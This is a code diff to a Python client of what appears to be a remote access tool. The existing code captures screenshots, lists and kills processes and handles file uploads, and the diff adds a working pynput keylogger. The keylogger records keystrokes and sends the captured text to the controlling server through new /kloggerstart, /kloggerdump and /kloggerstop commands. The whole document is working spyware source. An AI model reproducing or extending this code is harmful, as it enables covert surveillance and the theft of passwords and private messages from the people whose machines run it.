@@ -10,6 +10,7 @@ from datetime import datetime
 from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
 from psutil import process_iter, AccessDenied
+from pynput.keyboard import Listener, KeyCode
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
@@ -27,6 +28,8 @@ class Client(object):
     def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
         self.screenshotPath = '/tmp/736f6e61726973.png' if uname().sysname.lower() == 'linux' else f'C:/Users/{getuser()}/AppData/Local/Temp/736f6e61726973.png'
+        self.kloggerIsRunning = False
+        self.kloggerKeys = ''
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
@@ -34,7 +37,7 @@ class Client(object):
     # removing the screenshot file
     def removeScreenshot(self):
         Path(self.screenshotPath).unlink(missing_ok=True)
-    
+
     # kills some processes by name or pid
     def terminateProcess(self, processIdentifier):
         if not processIdentifier.isdigit():
@@ -71,6 +74,45 @@ class Client(object):
         self.sendHeader({"total": len(processesInfo), "bytes": len(dumps(processesInfo))})
         sleep(0.5)
         self.__Client.send(dumps(processesInfo))
+
+    def checkValidKeys(self, key):
+        if isinstance(key, KeyCode):
+            self.kloggerKeys += key.char
+        elif key.name == 'space':
+            self.kloggerKeys += ' '
+
+    def keyloggerStart(self, args):
+        if not self.kloggerIsRunning:
+            self.listener = Listener(on_press=self.checkValidKeys)
+            self.listener.start()
+            self.kloggerIsRunning = True
+            self.sendHeader({"content": f"[green]The listening started at [yellow]{datetime.now().strftime('%H:%M')}!\n"})
+        else:
+            self.sendHeader({"content": f"[red]The klogger is already running!"})
+
+    def keyloggerDump(self, args):
+        if self.kloggerIsRunning:
+            header = {
+                "namefile": f"klogger_dump-{datetime.now().strftime('%d.%m.%y-%H.%M.%S')}",
+                "extension": '.txt',
+                "bytes": len(self.kloggerKeys.encode()),
+                "path": "files",
+                "sucess": True
+            }
+
+            self.sendHeader(header)
+            sleep(0.5)
+            self.__Client.send(self.kloggerKeys.encode())
+        else:
+            self.sendHeader({"sucess": False, "content": "[red] Error: The klogger is not running!"})
+
+    def keyloggerStop(self, args):
+        if self.kloggerIsRunning:
+            self.listener.stop()
+            self.kloggerIsRunning = False
+            self.sendHeader({"content": f"[green]Klogger has ended at [yellow]{datetime.now().strftime('%H:%M')}!\n"})
+        else:
+            self.sendHeader({"content": "[red] Error: Klogger is not running."})
 
     # receiving a file from server side (upload)
     def upload(self, args):
@@ -205,6 +247,9 @@ class Client(object):
             "/processlist": {"action": self.getProcessList},
             "/processinfo": {"action": self.getProcessInfo},
             "/terminateprocess": {"action": self.terminateProcess},
+            "/kloggerstart": {"action": self.keyloggerStart},
+            "/kloggerdump": {"action": self.keyloggerDump},
+            "/kloggerstop": {"action": self.keyloggerStop},
             "cd": {"action": self.changeDirectory}
         }
 
